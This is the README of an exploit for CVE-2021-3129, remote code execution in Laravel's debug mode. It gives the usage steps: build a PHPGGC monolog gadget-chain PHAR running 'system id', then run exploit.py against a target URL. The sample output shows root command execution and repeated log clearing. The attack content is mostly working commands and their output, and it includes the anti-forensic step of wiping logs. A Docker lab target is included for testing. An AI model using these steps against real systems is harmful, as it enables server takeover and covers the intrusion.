# Description

Exploit for CVE-2021-3129  

# Requirements

[PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)

# Usage

## Build target

```bash
$ cd target
$ docker-compose up -d
```

## Exploit

```bash
$ php -d 'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
$ python3 exploit.py http://localhost:8000 /tmp/exploit.phar 
[+] Log file : /src/storage/logs/laravel.log
────────────────────────────────────────
[*] Padding head: False, Padding tail: False
[+] Logs cleared!
[+] Successfully converted to PHAR!
[+] PHAR triggered!
[+] Response: uid=0(root) gid=0(root) groups=0(root) ...

[+] Logs cleared!
────────────────────────────────────────
[*] Padding head: False, Padding tail: True
[+] Logs cleared!
[+] Successfully converted to PHAR!
[+] PHAR triggered!
[+] Response: 
[+] Logs cleared!
────────────────────────────────────────
[*] Padding head: True, Padding tail: False
[+] Logs cleared!
[+] Successfully converted to PHAR!
[+] PHAR triggered!
[+] Response: 
[+] Logs cleared!
────────────────────────────────────────
[*] Padding head: True, Padding tail: True
[+] Logs cleared!
[+] Successfully converted to PHAR!
[+] PHAR triggered!
[+] Response: uid=0(root) gid=0(root) groups=0(root) ...

[+] Logs cleared!
```

# References:

[Laravel <= v8.4.2 debug mode: Remote code execution](https://www.ambionics.io/blog/laravel-debug-rce)